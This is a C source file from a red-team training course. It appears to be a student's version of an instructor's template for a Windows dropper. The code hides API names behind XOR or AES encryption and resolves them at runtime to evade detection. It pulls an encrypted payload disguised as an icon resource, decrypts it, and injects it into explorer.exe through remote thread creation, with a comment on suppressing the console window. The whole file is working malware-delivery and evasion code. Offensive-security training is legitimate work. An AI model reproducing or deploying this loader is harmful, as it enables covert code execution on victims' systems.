/*

 Red Team Operator course code template
 storing payload in .rsrc section

 author: reenz0h (twitter: @sektor7net)

 student: James Fraser (twitter: @wulfgarpro)
*/

#include <windows.h>
#include <TlHelp32.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#include "resource.h"

LPVOID(WINAPI* pVirtualAlloc)(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

VOID(WINAPI* pRtlMoveMemory)(
    VOID UNALIGNED* Destination,
    VOID UNALIGNED* Source,
    SIZE_T         Length
    );

HRSRC(WINAPI* pFindResourceA) (
    HMODULE hModule,
    LPCSTR  lpName,
    LPCSTR  lpType
    );

HANDLE(WINAPI* pOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
    );

BOOL(WINAPI* pCloseHandle)(
    HANDLE hObject
    );

FARPROC(WINAPI* pGetProcAddress)(
    HMODULE hModule,
    LPCSTR  lpProcName
    );

LPVOID(WINAPI* pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

HANDLE(WINAPI* pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
    );

DWORD(WINAPI* pWaitForSingleObject)(
    HANDLE hHandle,
    DWORD  dwMilliseconds
    );

HGLOBAL(WINAPI* pLoadResource)(
    HMODULE hModule,
    HRSRC   hResInfo
    );

LPVOID(WINAPI* pLockResource)(
    HGLOBAL hResData
    );

DWORD(WINAPI* pSizeofResource)(
    HMODULE hModule,
    HRSRC   hResInfo
    );

HANDLE(WINAPI* pCreateToolhelp32Snapshot)(
    DWORD dwFlags,
    DWORD th32ProcessID
    );

BOOL(WINAPI* pProcess32First)(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
    );

BOOL(WINAPI* pProcess32Next)(
    HANDLE           hSnapshot,
    LPPROCESSENTRY32 lppe
    );

int(WINAPI* plstrcmpiA)(
    LPCSTR lpString1,
    LPCSTR lpString2
    );

HMODULE(WINAPI* pGetModuleHandleA)(
    LPCSTR lpModuleName
    );

#if 0
unsigned char KEY[] = "mysecretkeee";
// Run `python xorencrypt.py` to generate the below C-strings.
unsigned char sKernel32Dll[] = { 0x6, 0x1c, 0x1, 0xb, 0x6, 0x1e, 0x56, 0x46, 0x45, 0x1, 0x9, 0x9, 0x0 };
unsigned char sExplorerExe[] = { 0x8, 0x1, 0x3, 0x9, 0xc, 0x0, 0x0, 0x6, 0x45, 0x0, 0x1d, 0x0, 0x0 };
unsigned char sVirtualAllocEx[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x28, 0x1, 0x0 };
unsigned char sWriteProcessMemory[] = { 0x3a, 0xb, 0x1a, 0x11, 0x6, 0x22, 0x17, 0x1b, 0x8,
0x0, 0x16, 0x16, 0x20, 0x1c, 0x1e, 0xa, 0x11, 0xb, 0x0 };
unsigned char sCreateRemoteThread[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x37, 0x11, 0x6,
0xa, 0x11, 0x0, 0x39, 0x11, 0x1, 0x0, 0x2, 0x16, 0x0 };
unsigned char sCloseHandle[] = { 0x2e, 0x15, 0x1c, 0x16, 0x6, 0x3a, 0x4, 0x1a, 0xf, 0x9, 0x0, 0x0 };
unsigned char sOpenProcess[] = { 0x22, 0x9, 0x16, 0xb, 0x33, 0x0, 0xa, 0x17, 0xe, 0x16, 0x16, 0x0 };
unsigned char sRtlMoveMemory[] = { 0x3f, 0xd, 0x1f, 0x28, 0xc, 0x4, 0x0, 0x39, 0xe, 0x8, 0xa, 0x17, 0x14, 0x0 };
unsigned char sVirtualAlloc[] = { 0x3b, 0x10, 0x1, 0x11, 0x16, 0x13, 0x9, 0x35, 0x7, 0x9, 0xa, 0x6, 0x0 };
unsigned char sSizeofResource[] = { 0x3e, 0x10, 0x9, 0x0, 0xc, 0x14, 0x37, 0x11, 0x18, 0xa, 0x10, 0x17, 0xe, 0x1c, 0x0 };
unsigned char sLockResource[] = { 0x21, 0x16, 0x10, 0xe, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0, 0x0 };
unsigned char sLoadResource[] = { 0x21, 0x16, 0x12, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0, 0x0 };
unsigned char sFindResourceA[] = { 0x2b, 0x10, 0x1d, 0x1, 0x31, 0x17, 0x16, 0x1b, 0x1e, 0x17, 0x6, 0x0, 0x2c, 0x0 };
unsigned char sWaitForSingleObject[] = { 0x3a, 0x18, 0x1a, 0x11, 0x25, 0x1d, 0x17, 0x27, 0x2, 0xb, 0x2, 0x9, 0x8, 0x36, 0x11, 0xf, 0x6, 0x11, 0x11, 0x0 };
unsigned char slstrcmpiA[] = { 0x1, 0xa, 0x7, 0x17, 0x0, 0x1f, 0x15, 0x1d, 0x2a, 0x0 };
unsigned char sProcess32Next[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x2b,
0x0, 0x1d, 0x19, 0x0 };
unsigned char sProcess32First[] = { 0x3d, 0xb, 0x1c, 0x6, 0x6, 0x1, 0x16, 0x47, 0x59, 0x23, 0xc, 0x17, 0x1e, 0xd, 0x0 };
unsigned char sCreateToolhelp32Snapshot[] = { 0x2e, 0xb, 0x16, 0x4, 0x17, 0x17, 0x31, 0x1b, 0x4, 0x9, 0xd, 0x0, 0x1, 0x9, 0x40, 0x57, 0x30, 0x1c, 0x4, 0x4, 0x18, 0xd, 0xa, 0x11, 0x0
};
unsigned char sGetProcAddress[] = { 0x2a, 0x1c, 0x7, 0x35, 0x11, 0x1d, 0x6, 0x35, 0xf, 0x1, 0x17, 0x0, 0x1e, 0xa, 0x0 };
unsigned char sGetModuleHandleA[] = { 0x2a, 0x1c, 0x7, 0x28, 0xc, 0x16, 0x10, 0x18, 0xe, 0x2d, 0x4, 0xb, 0x9, 0x15, 0x16, 0x24, 0x0 };
#else
// Run `python aesencrypt.py` to generate the below C-strings.
unsigned char KEY[] = { 0x22, 0xac, 0x3f, 0x30, 0xb3, 0x8, 0x4e, 0xd0, 0x4, 0x19, 0x94, 0x7e, 0xcb, 0xe6, 0x6, 0x79 };
unsigned char sKernel32Dll[] = { 0x1f, 0x5c, 0x6d, 0x93, 0xc8, 0x7e, 0x7, 0xba, 0x6f, 0x3, 0x3e, 0xf8, 0x38, 0xc7, 0x65, 0x3a };
unsigned char sExplorerExe[] = { 0xfd, 0x79, 0xef, 0x66, 0x8a, 0x59, 0xf8, 0xee, 0xbf, 0x42, 0xeb, 0xa1, 0xa8, 0x32, 0xa4, 0x8d };
unsigned char sVirtualAllocEx[] = { 0xd8, 0x77, 0xe1, 0xc8, 0x96, 0x1b, 0x3f, 0xcb, 0x88, 0x99, 0x8c, 0x84, 0x26, 0x73, 0x58, 0x3e };
unsigned char sWriteProcessMemory[] = { 0x83, 0xc, 0xc6, 0x4c, 0x58, 0x54, 0xc6, 0x6e, 0xec, 0x40, 0xec, 0x38, 0x75, 0xa1, 0xe0, 0x8d, 0xc8, 0x1e, 0xda, 0x70, 0x5f, 0xe6, 0x31, 0xe0, 0xa9, 0x40, 0x8f, 0x18, 0x1a, 0xf7, 0x4a, 0xb5 };
unsigned char sCreateRemoteThread[] = { 0x3e, 0x17, 0x9e, 0xac, 0x27, 0x1b, 0x95, 0xa8, 0x51, 0xcc, 0x97, 0xb7, 0xa0, 0xc6, 0xf6, 0x6d, 0x48, 0x37, 0xbc, 0x99, 0xfe, 0x1f, 0xe, 0xf, 0x8e, 0x3a, 0xa9, 0x5a, 0x38, 0x90, 0xc8, 0xca };
unsigned char sCloseHandle[] = { 0xfa, 0xa4, 0xe6, 0x19, 0xab, 0x70, 0x6c, 0x95, 0x65, 0x3c, 0xac, 0x3f, 0xa4, 0x49, 0x1a, 0x9d };
unsigned char sOpenProcess[] = { 0x85, 0x4a, 0x75, 0xed, 0x75, 0xc4, 0x45, 0x1d, 0x4c, 0x14, 0x7a, 0xe3, 0x76, 0xbf, 0xdb, 0x14 };
unsigned char sRtlMoveMemory[] = { 0xdc, 0xfb, 0xfa, 0x1, 0x8e, 0xfc, 0x66, 0x47, 0xef, 0xf8, 0x7a, 0x8b, 0x3, 0x9, 0x86, 0xbe };
unsigned char sVirtualAlloc[] = { 0x5, 0xa5, 0xde, 0xbf, 0x87, 0x1c, 0x47, 0x3c, 0x80, 0xb5, 0xa0, 0x9b, 0x4c, 0x8b, 0xf6, 0x10 };
unsigned char sSizeofResource[] = { 0x7d, 0x57, 0x7b, 0xd3, 0xf1, 0xb9, 0x40, 0x19, 0x6e, 0xdb, 0x72, 0x92, 0x8d, 0x44, 0x31, 0xbd };
unsigned char sLockResource[] = { 0xa, 0x3b, 0xf4, 0x99, 0x94, 0xe6, 0xd5, 0x88, 0x4c, 0xff, 0xae, 0x0, 0x2b, 0xb3, 0x77, 0xf2 };
unsigned char sLoadResource[] = { 0x52, 0xe0, 0x67, 0x7e, 0x3e, 0x29, 0x5c, 0x93, 0x2b, 0xa6, 0xaa, 0x3d, 0xe9, 0x7b, 0x40, 0x75 };
unsigned char sFindResourceA[] = { 0xcc, 0x5b, 0xef, 0x29, 0x8b, 0x41, 0x24, 0xf8, 0xc5, 0x39, 0xfc, 0xc2, 0x40, 0xe3, 0x4f, 0xcc };
unsigned char sWaitForSingleObject[] = { 0x6, 0xf1, 0x87, 0x87, 0xf2, 0x55, 0x5b, 0x8a, 0x17, 0xe8, 0x6a, 0x9d, 0x3b, 0xe1, 0x4b, 0x2d, 0x61, 0x3d, 0x80, 0x41, 0x3d, 0xd2, 0x9, 0x37, 0x9e, 0x5f, 0xf7, 0xc5, 0xaf, 0xf1, 0xa3, 0x7c };
unsigned char slstrcmpiA[] = { 0xa, 0x4a, 0x60, 0x75, 0x85, 0x9b, 0x6d, 0x46, 0x54, 0xa, 0x89, 0x78, 0x2a, 0x44, 0x8c, 0x5c };
unsigned char sProcess32Next[] = { 0x13, 0x9, 0x28, 0x41, 0x84, 0x9c, 0x7d, 0x9e, 0xb9, 0x90, 0x61, 0x69, 0xd3, 0x5c, 0xee, 0xf7 };
unsigned char sProcess32First[] = { 0x16, 0x30, 0x62, 0x5d, 0xe2, 0xc7, 0x5, 0x3e, 0xa6, 0x88, 0xb, 0x52, 0x8b, 0xc, 0xf6, 0x49 };
unsigned char sCreateToolhelp32Snapshot[] = { 0xd5, 0x2e, 0xb6, 0x84, 0x12, 0x3b, 0xb7, 0x33, 0x94, 0xad, 0xfc, 0x62, 0xcd, 0x22, 0x96, 0x33, 0x7f, 0x51, 0xeb, 0xe2, 0x38, 0x92, 0xa7,
0xa9, 0x96, 0x48, 0xc5, 0xe3, 0xdf, 0x2a, 0x95, 0x98 };
unsigned char sGetProcAddress[] = { 0x1b, 0x9a, 0xec, 0x78, 0xbd, 0x63, 0x58, 0xc6, 0xd9, 0x54, 0x6a, 0xc0, 0x53, 0x4b, 0x4d, 0x9d };
unsigned char sGetModuleHandleA[] = { 0xe4, 0x86, 0x7, 0xa7, 0xe2, 0xf8, 0x79, 0xc9, 0x97, 0x1d, 0x8e, 0xa9, 0x4b, 0xbd, 0x39, 0xb2, 0xb1, 0x73, 0xe6, 0xe9, 0xa3, 0x8, 0x8b, 0x99, 0x7c, 0x7f, 0xb4, 0x1, 0xc, 0x3, 0x3b, 0x9 };
#endif

void Xor(char* data, size_t data_len, char* key, size_t key_len)
{
    size_t j = 0;
    for (size_t i = 0; i < data_len - 1; i++)
    {
        data[i] ^= key[j];
        j++;
        if (j == key_len - 1)
        {
            j = 0; // Wrap around the key.
        }
    }
    data[data_len] = '\0';
}

int AESDecrypt(char* payload, unsigned int payload_len, char* key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)) {
        return -1;
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        return -1;
    }

    if (!CryptDecrypt(hKey, (HCRYPTHASH)NULL, 0, 0, payload, &payload_len)) {
        return -1;
    }

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}


#if 0
void DecryptStrings() {
    Xor((char*)sKernel32Dll, sizeof(sKernel32Dll), KEY, sizeof(KEY));
    Xor((char*)sExplorerExe, sizeof(sExplorerExe), KEY, sizeof(KEY));
    Xor((char*)sGetProcAddress, sizeof(sGetProcAddress), KEY, sizeof(KEY));
    Xor((char*)sGetModuleHandleA, sizeof(sGetModuleHandleA), KEY, sizeof(KEY));
    Xor((char*)sFindResourceA, sizeof(sFindResourceA), KEY, sizeof(KEY));
    Xor((char*)sLoadResource, sizeof(sLoadResource), KEY, sizeof(KEY));
    Xor((char*)sLockResource, sizeof(sLockResource), KEY, sizeof(KEY));
    Xor((char*)sSizeofResource, sizeof(sSizeofResource), KEY, sizeof(KEY));
    Xor((char*)sVirtualAlloc, sizeof(sVirtualAlloc), KEY, sizeof(KEY));
    Xor((char*)sRtlMoveMemory, sizeof(sRtlMoveMemory), KEY, sizeof(KEY));
    Xor((char*)sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), KEY, sizeof(KEY));
    Xor((char*)sProcess32Next, sizeof(sProcess32Next), KEY, sizeof(KEY));
    Xor((char*)sProcess32First, sizeof(sProcess32First), KEY, sizeof(KEY));
    Xor((char*)slstrcmpiA, sizeof(slstrcmpiA), KEY, sizeof(KEY));
    Xor((char*)sCloseHandle, sizeof(sCloseHandle), KEY, sizeof(KEY));
    Xor((char*)sOpenProcess, sizeof(sOpenProcess), KEY, sizeof(KEY));
    Xor((char*)sVirtualAllocEx, sizeof(sVirtualAllocEx), KEY, sizeof(KEY));
    Xor((char*)sWriteProcessMemory, sizeof(sWriteProcessMemory), KEY, sizeof(KEY));
    Xor((char*)sCreateRemoteThread, sizeof(sCreateRemoteThread), KEY, sizeof(KEY));
    Xor((char*)sWaitForSingleObject, sizeof(sWaitForSingleObject), KEY, sizeof(KEY));
}
#else
void DecryptStrings() {
    AESDecrypt((char*)sKernel32Dll, sizeof(sKernel32Dll), KEY, sizeof(KEY));
    AESDecrypt((char*)sExplorerExe, sizeof(sExplorerExe), KEY, sizeof(KEY));
    AESDecrypt((char*)sGetProcAddress, sizeof(sGetProcAddress), KEY, sizeof(KEY));
    AESDecrypt((char*)sGetModuleHandleA, sizeof(sGetModuleHandleA), KEY, sizeof(KEY));
    AESDecrypt((char*)sFindResourceA, sizeof(sFindResourceA), KEY, sizeof(KEY));
    AESDecrypt((char*)sLoadResource, sizeof(sLoadResource), KEY, sizeof(KEY));
    AESDecrypt((char*)sLockResource, sizeof(sLockResource), KEY, sizeof(KEY));
    AESDecrypt((char*)sSizeofResource, sizeof(sSizeofResource), KEY, sizeof(KEY));
    AESDecrypt((char*)sVirtualAlloc, sizeof(sVirtualAlloc), KEY, sizeof(KEY));
    AESDecrypt((char*)sRtlMoveMemory, sizeof(sRtlMoveMemory), KEY, sizeof(KEY));
    AESDecrypt((char*)sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), KEY, sizeof(KEY));
    AESDecrypt((char*)sProcess32Next, sizeof(sProcess32Next), KEY, sizeof(KEY));
    AESDecrypt((char*)sProcess32First, sizeof(sProcess32First), KEY, sizeof(KEY));
    AESDecrypt((char*)slstrcmpiA, sizeof(slstrcmpiA), KEY, sizeof(KEY));
    AESDecrypt((char*)sCloseHandle, sizeof(sCloseHandle), KEY, sizeof(KEY));
    AESDecrypt((char*)sOpenProcess, sizeof(sOpenProcess), KEY, sizeof(KEY));
    AESDecrypt((char*)sVirtualAllocEx, sizeof(sVirtualAllocEx), KEY, sizeof(KEY));
    AESDecrypt((char*)sWriteProcessMemory, sizeof(sWriteProcessMemory), KEY, sizeof(KEY));
    AESDecrypt((char*)sCreateRemoteThread, sizeof(sCreateRemoteThread), KEY, sizeof(KEY));
    AESDecrypt((char*)sWaitForSingleObject, sizeof(sWaitForSingleObject), KEY, sizeof(KEY));
}
#endif

void GetAddresses() {
    pGetProcAddress = GetProcAddress(GetModuleHandleA(sKernel32Dll), sGetProcAddress);
    pGetModuleHandleA = pGetProcAddress(GetModuleHandleA(sKernel32Dll), sGetModuleHandleA);
    pVirtualAlloc = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sVirtualAlloc);
    pRtlMoveMemory = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sRtlMoveMemory);
    pOpenProcess = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sOpenProcess);
    pCloseHandle = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sCloseHandle);
    pVirtualAllocEx = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sVirtualAllocEx);
    pWriteProcessMemory = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sWriteProcessMemory);
    pFindResourceA = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sFindResourceA);
    pCreateRemoteThread = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sCreateRemoteThread);
    pWaitForSingleObject = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sWaitForSingleObject);
    pLoadResource = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sLoadResource);
    pLockResource = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sLockResource);
    pSizeofResource = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sSizeofResource);
    pCreateToolhelp32Snapshot = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sCreateToolhelp32Snapshot);
    pProcess32First = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sProcess32First);
    pProcess32Next = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), sProcess32Next);
    plstrcmpiA = pGetProcAddress(pGetModuleHandleA(sKernel32Dll), slstrcmpiA);
}

int FindTarget(const char* procname)
{
    HANDLE hProcSnap;
    PROCESSENTRY32 pe32;
    int pid = 0;

    hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (INVALID_HANDLE_VALUE == hProcSnap)
    {
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!pProcess32First(hProcSnap, &pe32))
    {
        pCloseHandle(hProcSnap);
        return 0;
    }

    while (pProcess32Next(hProcSnap, &pe32))
    {
        if (plstrcmpiA(procname, pe32.szExeFile) == 0)
        {
            pid = pe32.th32ProcessID;
            break;
        }
    }

    pCloseHandle(hProcSnap);

    return pid;
}

int Inject(HANDLE hProc, unsigned char* payload, unsigned int payload_len)
{
    LPVOID pRemoteCode = NULL;
    HANDLE hThread = NULL;

    pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
    pWriteProcessMemory(hProc, pRemoteCode, (PVOID)payload, (SIZE_T)payload_len, (SIZE_T*)NULL);

    hThread = pCreateRemoteThread(hProc, NULL, 0, pRemoteCode, NULL, 0, NULL);
    if (hThread != NULL)
    {
        pWaitForSingleObject(hThread, 500);
        pCloseHandle(hThread);
        return 0;
    }

    return -1;
}

// Use `WinMain instead of `main` and compile and link `dropPEr` with `/SUBSYSTEM:WINDOWS` to
// prevent any console windows from appearing when the dropper is executed.
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    void* exec_mem;
    HGLOBAL resHandle = NULL;
    HRSRC res;

    unsigned char* payload;
    unsigned int payloadLen;

    int pid = 0;
    HANDLE hProc = NULL;

    DecryptStrings();
    GetAddresses();

    // Extract payload from resources section.
    res = pFindResourceA(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
    resHandle = pLoadResource(NULL, res);
    payload = (unsigned char*)pLockResource(resHandle);
    payloadLen = pSizeofResource(NULL, res);

    // Allocate some memory for payload.
    exec_mem = pVirtualAlloc(0, payloadLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // Copy payload to allocated buffer.
    pRtlMoveMemory(exec_mem, payload, payloadLen);

    // Decrypt the payload.
#if 0
    Xor((char*)exec_mem, payloadLen, KEY, sizeof(KEY));
#else
    AESDecrypt((char*)exec_mem, payloadLen, KEY, sizeof(KEY));
#endif


    // Inject the decrypted payload into `explorer.exe`.
    pid = FindTarget(sExplorerExe);
    if (pid)
    {
        // Try to open target process.
        hProc = pOpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
            PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
        if (hProc != NULL)
        {
            Inject(hProc, (unsigned char*)exec_mem, payloadLen);
            pCloseHandle(hProc);
        }
    }
}
